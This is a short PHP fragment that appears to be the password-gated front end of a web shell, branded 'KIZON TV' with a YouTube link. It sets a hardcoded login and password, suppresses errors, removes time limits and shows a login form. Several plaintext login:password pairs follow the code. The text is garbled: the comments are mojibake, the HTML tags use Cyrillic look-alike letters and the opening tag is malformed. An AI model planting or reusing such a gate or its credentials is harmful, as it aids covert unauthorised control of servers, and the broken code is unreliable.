<php die() ?>
<? 
session_start(); 
error_reporting(0); 
set_time_limit(9999999); 
$login='peyn'; //Ð›Ð¾Ð³Ð¸Ð½ Ð´Ð»Ñ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð° Ðº Ð±Ð°Ð·Ðµ 
$password='75elonog'; //ÐŸÐ°Ñ€Ð¾Ð»ÑŒ Ð´Ð»Ñ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð° Ðº Ð±Ð°Ð·Ðµ 
$header='<><head><title>'.getenv("HTTP_HOST").'</title><meta http-equiv="Content-Type" content="text/HÐ¢ÐœL; charset=windows-1251">'.$style.'</head><bÐ¾dÑƒ leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>'; 
$footer='</bÐ¾dÑƒ></HÐ¢ÐœL>'; 

if(@$_POST['action']=="exit") unset($_SESSION['an']); 
if(@$_POST['login']==$login && @$_POST['password']==$password) $_SESSION['an']=1;
if(@$_SESSION['an']==0){ 
echo $header; 
echo '<center><b>KIZON TV</b><br>youtube.com/DenVeyron</b><br><table><form method="POST"><tr><td>login:</td><td><input type="text" name="login" value=""></td></tr><tr><td>password:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="GO"></td></tr></form></table></center>'; 
echo $footer; 
exit;} 
?> login:pass
 kek3:lol2 

 888444kizon:2939842398723948711234 
